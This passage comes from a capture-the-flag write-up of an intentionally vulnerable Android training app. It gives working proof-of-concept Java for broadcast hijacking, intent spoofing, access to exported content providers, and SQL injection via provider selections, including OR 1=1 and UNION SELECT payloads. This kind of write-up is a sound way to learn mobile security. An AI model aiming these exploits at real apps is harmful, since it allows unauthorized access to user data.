        Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
        Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
        Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);

        if (resultCode != 0) {
            Utils.showIntentDialog(context, "BroadcastReceiver.onReceive", intent2);
            Flag18Activity flag18Activity = Flag18Activity.this;
            flag18Activity.success(flag18Activity);
        }
    }
}, null, 0, null, null);
```

Since the broadcast only specifies an action and does not target a particular application, I could register my own receiver for `io.hextree.broadcast.FREE_FLAG`.

The interesting part was that the target checks the result returned from the broadcast:

```java
int resultCode = getResultCode();

if (resultCode != 0) {
    ...
    flag18Activity.success(flag18Activity);
}
```

There was no validation of where that result came from. I could therefore make my receiver return a non-zero result code.

I created a `Flag18Receiver` in my PoC application:

```java
public class Flag18Receiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Log.i("Flag18Receiver", "Received FREE_FLAG");

        setResultCode(1);
    }
}
```

Then I registered it dynamically in my `Main_Hextree` activity:

```java
BroadcastReceiver receiver = new Flag18Receiver();

IntentFilter filter =
        new IntentFilter("io.hextree.broadcast.FREE_FLAG");

registerReceiver(
        receiver,
        filter,
        Context.RECEIVER_EXPORTED
);
```

I initially tried to launch `Flag18Activity` directly from my PoC, but this failed because the activity was declared as:

```xml
android:exported="false"
```

So instead, I started my PoC app first and registered the receiver. I then opened **Flag 18 through the Hextree application itself**.

When `Flag18Activity` started, it sent the `FREE_FLAG` ordered broadcast. My receiver caught it and executed:

```java
setResultCode(1);
```

This caused the receiver inside `Flag18Activity` to get a result code of `1`. Since the application checks:

```java
if (resultCode != 0)
```

the condition was satisfied and the success function was called.

The flag was then displayed:

```text
Flag: HXT{hijacking-broadcast-intent-as91}
```

# Flag 17 — Getting the Returned Result

After opening `Flag17Receiver` in **JADX**, I noticed that it checks whether the incoming broadcast is an **ordered broadcast**:

```java
if (isOrderedBroadcast()) {
    if (intent.getStringExtra("flag").equals(FlagSecret)) {
        success(context, FlagSecret);
        return;
    }
}
```

It also expects an extra named `flag` with the value:

```text
give-flag-17
```

So I created an explicit `Intent` targeting `Flag17Receiver` and added the required extra:

```java
Intent intent = new Intent();

intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag17Receiver"
));

intent.putExtra("flag", "give-flag-17");
```

Since the receiver checks `isOrderedBroadcast()`, I used `sendOrderedBroadcast()`:

```java
sendOrderedBroadcast(
        intent,
        null,
        new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle resultExtras = getResultExtras(false);

                boolean success = false;
                String flag = null;

                if (resultExtras != null) {
                    success = resultExtras.getBoolean("success", false);
                    flag = resultExtras.getString("flag");
                }

                Toast.makeText(
                        context,
                        "\nFlag: " + flag,
                        Toast.LENGTH_LONG
                ).show();
            }
        },
        null,
        0,
        null,
        null
);
```

I initially set `success` to `false` and `flag` to `null` as default values. After the target receiver processes the broadcast, it creates a result `Bundle` containing the actual values:

```java
Bundle bundle = new Bundle();

bundle.putBoolean("success", true);
bundle.putString("flag", flag17Activity.f.appendLog(flag17Activity.flag));

setResult(-1, "Flag 17 Completed", bundle);
```

I then used:

```java
Bundle resultExtras = getResultExtras(false);
```

to retrieve the `Bundle` returned by the receiver. If the Bundle exists, I extract the returned values:

```java
success = resultExtras.getBoolean("success", false);
flag = resultExtras.getString("flag");
```

So the values that started as:

```text
success = false
flag = null
```

are replaced with the values returned by `Flag17Receiver`:

```text
success = true
flag = HXT{returned-result-ds82s}
```

Finally, I displayed the returned flag using a Toast:
```text
Flag: HXT{returned-result-ds82s}```

# Flag 20 — Spoofing the Notification Intent

After opening Flag 20, I checked the notification and then inspected `Flag20Activity` and `Flag20Receiver` in **JADX**.

The notification uses the action:

```java
new Intent(GET_FLAG)
```

where:

```java
GET_FLAG = "io.hextree.broadcast.GET_FLAG";
```

In `Flag20Receiver`, I found that it checks for a `give-flag` extra:

```java
if (intent.getBooleanExtra("give-flag", false)) {
    success(context);
}
```

So I created my own broadcast with the same action and added `give-flag=true`:

```java
Intent intent = new Intent("io.hextree.broadcast.GET_FLAG");
intent.putExtra("give-flag", true);
sendBroadcast(intent);
```

After opening Flag 20 and running this from my PoC app, the receiver accepted the broadcast and triggered the success flow. I then opened the Flag activity and got:

```text
HXT{spoof-notificaiton-result-er12d}
```

# Content-and FileProviders

# Flag 30 — Accessing an Exported Content Provider

After opening the APK in **JADX-GUI**, I inspected the `AndroidManifest.xml` and looked for exported `ContentProvider`s. I found `Flag30Provider`:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag30Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag30"/>
```

The important parts were `android:exported="true"` and the authority:

```text
io.hextree.flag30
```

Since the provider was exported and did not require any read or write permission, I could access it from my own PoC application.

I then opened `Flag30Provider` in **JADX** and inspected the `query()` method. I found that it only processes requests when the URI path is `/success`:

```java
if (!uri.getPath().equals("/success")) {
    return null;
}
```

Combining the authority with this path gave me the ContentProvider URI:

```text
content://io.hextree.flag30/success
```

I then queried this URI from my PoC app using:

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://io.hextree.flag30/success"),
    null,
    null,
    null,
    null
);
```

Since the result was returned as a `Cursor`, I iterated through it and displayed all the column names and values:

```java
if (cursor != null && cursor.moveToFirst()) {
    do {
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < cursor.getColumnCount(); i++) {
            if (sb.length() > 0) {
                sb.append(", ");
            }

            sb.append(
                cursor.getColumnName(i) + " = " +
                cursor.getString(i)
            );
        }

        Log.d("evil", sb.toString());

    } while (cursor.moveToNext());
}
```

I used the returned values in my PoC application to display the Cursor contents on the screen. The result showed:

```text
id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
```

From the `value` field, I obtained the flag:

```text
HXT{query-provider-table-1vsd8}
```

# Flag 31 — Querying a ContentProvider with a URI Matcher

After opening the APK in **JADX-GUI**, I inspected the `AndroidManifest.xml` and found the exported `Flag31Provider`:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag31Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag31"/>
```

Since the provider is exported, I could access it from my PoC application. I then opened `Flag31Provider` in **JADX** and found a `UriMatcher`:

```java
uriMatcher2.addURI(AUTHORITY, "flags", 1);
uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
```

The `flag/#` pattern means that the provider expects a numeric ID in the URI.

I then inspected the `query()` method and found:

```java
if (match == 2) {
    long parseId = ContentUris.parseId(uri);

    if (parseId == 31) {
        LogHelper logHelper = new LogHelper(getContext());
        logHelper.addTag(uri.getPath());
        success(logHelper);
    }
```

The important part was:

```java
if (parseId == 31) {
    success(logHelper);
}
```

This showed me that I needed to use `31` as the ID in the URI.

Using the authority from the manifest and the `flag/#` pattern from the `UriMatcher`, I constructed:

```text
content://io.hextree.flag31/flag/31
```

I then queried this URI from my PoC application:

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://io.hextree.flag31/flag/31"),
    null,
    null,
    null,
    null
);
```

I returned and displayed the `Cursor` using the **same Cursor iteration code I used in the previous flag**. The returned data contained:

```text
HXT{query-uri-matcher-sakj1}
```

**Flag:** `HXT{query-uri-matcher-sakj1}`

# Flag 32 — SQL Injection in a ContentProvider

After opening the APK in **JADX-GUI**, I inspected the `AndroidManifest.xml` and found the exported `Flag32Provider`:

```xml
<provider
    android:name="io.hextree.attacksurface.providers.Flag32Provider"
    android:enabled="true"
    android:exported="true"
    android:authorities="io.hextree.flag32"/>
```

Since the provider is exported, I could access it from my PoC application.

I then inspected the `query()` method and noticed that when the URI uses the `flags` path, the selection supplied by the caller is directly added to the SQL condition:

```java
String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");
```

The provider normally builds a condition starting with:

```sql
visible=1 AND (<selection>)
```

I used this to perform an SQL injection by supplying:

```text
1) OR 1=1 -- -
```

I also used the `flags` URI:

```text
content://io.hextree.flag32/flags
```

My final PoC query was:

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://io.hextree.flag32/flags"),
    null,
    "1) OR 1=1 -- -",
    null,
    null
);
```

This caused the query to return the visible records, including the `flag32` entry. I then displayed the returned Cursor using the same Cursor iteration code as before, which revealed:

```text
HXT{sql-injection-in-provider-1gs82}
```

**Flag:** `HXT{sql-injection-in-provider-1gs82}`

# Flag 33 — UNION SELECT SQL Injection

After opening the APK in **JADX**, I inspected `Flag33Activity1` and found that it was exported and could be launched using the action `io.hextree.FLAG33`.

```java
Intent intent = new Intent("io.hextree.FLAG33");

intent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag33Activity1"
);

startActivityForResult(intent, 1);
```

The activity returns a URI, which I retrieved using:

```java
Uri uri = intent.getData();
```

I then inspected `Flag33Provider1` and found that its `query()` method passes the `selection` parameter directly into the database query:

```java
readableDatabase.query(
        FlagDatabaseHelper.TABLE_FLAG,
        strArr,
        str,
        strArr2,
        null,
        null,
        str2
);
```

Since `str` is the selection, the query is effectively:

```sql
SELECT * FROM Flag WHERE <my input>
```

I first tested this with:

```java
"1 OR 1=1"
```

This returned the rows from the `Flag` table, confirming that I could inject SQL through the selection parameter.

While inspecting `FlagDatabaseHelper`, I found that Flag 33 was actually stored in the `Note` table:

```text
title = flag33
content = HXT{censored}
```

The `Flag` table has four columns:

```text
_id, name, value, visible
```

while `Note` has three:

```text
_id, title, content
```

Since I wanted to retrieve data from `Note`, I used a `UNION SELECT`. I first made the original query return no rows with `1=0`, then selected the required values from `Note`. I added `1` as the fourth column so that both sides of the `UNION` had four columns.

```java
Cursor cursor = getContentResolver().query(
        uri,
        null,
        "1=0 UNION SELECT _id, title, content, 1 FROM Note WHERE title='flag33'",
        null,
        null
);
```

This effectively produces:

```sql
SELECT * FROM Flag
WHERE 1=0
UNION
SELECT _id, title, content, 1
FROM Note
WHERE title='flag33'
```

My cursor code then displayed the returned values, revealing:

```text
HXT{union-select-injection-1bs98}
```

